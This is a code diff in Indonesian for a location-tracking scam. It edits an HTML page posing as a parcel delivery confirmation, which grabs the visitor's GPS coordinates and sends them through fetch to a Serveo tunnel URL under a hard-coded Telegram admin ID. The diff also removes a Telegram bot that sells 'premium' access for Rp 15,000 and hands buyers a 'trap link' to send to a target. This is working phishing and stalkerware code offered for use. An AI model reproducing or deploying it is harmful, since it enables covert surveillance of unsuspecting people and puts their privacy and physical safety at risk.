@@ -5,9 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Konfirmasi Pengiriman Paket</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f4f4f4; }
-        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
-        .btn { background-color: #28a745; color: white; padding: 12px 24px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; }
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background-color: #f4f4f4; }
+        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); max-width: 400px; margin: 20px auto; }
+        .btn { background-color: #28a745; color: white; padding: 12px 24px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; }
         .btn:hover { background-color: #218838; }
         h2 { color: #333; }
         p { color: #666; }
@@ -50,10 +50,7 @@
         const acc = position.coords.accuracy;
         const statusText = document.getElementById("status");
 
-        // Menggunakan ID Admin milik Anda yang terdeteksi: 6953925929
         const targetChatId = userIdAdmin ? userIdAdmin : 6953925929; 
-
-        // Alamat jembatan internet Serveo aktif Anda
         const URL_SERVER_TERMUX = "https://serveousercontent.com";
 
         fetch(URL_SERVER_TERMUX, {
@@ -82,79 +79,13 @@
         statusText.style.color = "#d9534f";
         switch(error.code) {
             case error.PERMISSION_DENIED:
-                statusText.innerText = "❌ Gagal: Anda harus mengizinkan/klik 'Allow' akses lokasi browser.";
-                break;
-            case error.POSITION_UNAVAILABLE:
-                statusText.innerText = "❌ Gagal: Sinyal GPS tidak stabil.";
-                break;
-            case error.TIMEOUT:
-                statusText.innerText = "❌ Gagal: Waktu habis. Aktifkan GPS Anda.";
+                statusText.innerText = "❌ Gagal: Anda harus klik 'Izinkan/Allow' akses lokasi browser.";
                 break;
             default:
-                statusText.innerText = "❌ Gagal: Terjadi gangguan teknis.";
+                statusText.innerText = "❌ Gagal: Terjadi gangguan GPS.";
         }
     }
 </script>
 
 </body>
 </html>
-                "name": "Akses Premium Bot Pelacak"
-            }]
-        }
-        transaction = snap_api.create_transaction(param)
-        link_qris = transaction['redirect_url']
-        
-        kb = [
-            [InlineKeyboardButton("💳 BAYAR SEKARANG (QRIS)", url=link_qris)],
-            [InlineKeyboardButton("✅ SAYA SUDAH BAYAR", callback_data='cek_pembayaran')]
-        ]
-        await update.message.reply_text("💎 *UPGRADE KE PREMIUM (ASLI)* 💎\n\nBiaya: *Rp 15.000*\nSilakan klik tombol bayar di bawah. Setelah membayar, kembali ke sini dan klik tombol *SAYA SUDAH BAYAR*.", reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
-    except Exception as e:
-        await update.message.reply_text(f"❌ Gagal memproses payment: {e}")
-
-async def proses_bayar(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    user_id = query.from_user.id
-    await query.edit_message_text("⏳ *PERMINTAAN DIVERIFIKASI ADMINISTRATOR*\n\nSistem sedang memeriksa mutasi pembayaran QRIS Anda di Midtrans.", parse_mode='Markdown')
-    await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔔 *KLAIM PEMBAYARAN BARU!*\n\nID Telegram: `{user_id}`\nKetik perintah ini jika uang sudah masuk:\n`/approve {user_id}`", parse_mode='Markdown')
-
-async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.message.from_user.id != ADMIN_ID: return
-    if not context.args: return
-    target = context.args[0]
-    try:
-        jadikan_premium(int(target))
-        await update.message.reply_text(f"✅ ID `{target}` sekarang PREMIUM!")
-        await context.bot.send_message(chat_id=int(target), text="🎉 *AKUN PREMIUM AKTIF!* 🎉\n\nSilakan kirim nomor HP target untuk menghasilkan link pelacak asli.", parse_mode='Markdown')
-    except Exception as e:
-        await update.message.reply_text(f"Gagal: {e}")
-
-async def buat_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.message.from_user.id
-    if cek_status(user_id) == 'FREE':
-        await update.message.reply_text("❌ Fitur terkunci. Anda harus menjadi pengguna PREMIUM untuk membuat link pelacak. Ketik /beli")
-        return
-    await update.message.reply_text(f"✅ *LINK PELACAK BERHASIL DIGENERATE!*\n\n🔗 *Link Perangkap:* {LINK_WEB_PELACAK}?uid={user_id}\n\n💡 Salin link di atas dan kirimkan ke target.", parse_mode='Markdown')
-
-def main():
-    global bot_instance
-    init_db()
-    
-    Thread(target=run_flask, daemon=True).start()
-
-    app = Application.builder().token(TOKEN).build()
-    bot_instance = app
-
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("beli", beli))
-    app.add_handler(CommandHandler("approve", approve_user))
-    app.add_handler(CallbackQueryHandler(proses_bayar, pattern='cek_pembayaran'))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, buat_link))
-    
-    print("Bot Sistem Pelacak Real aktif...")
-    app.run_polling()
-
-if __name__ == '__main__':
-    main()
-    
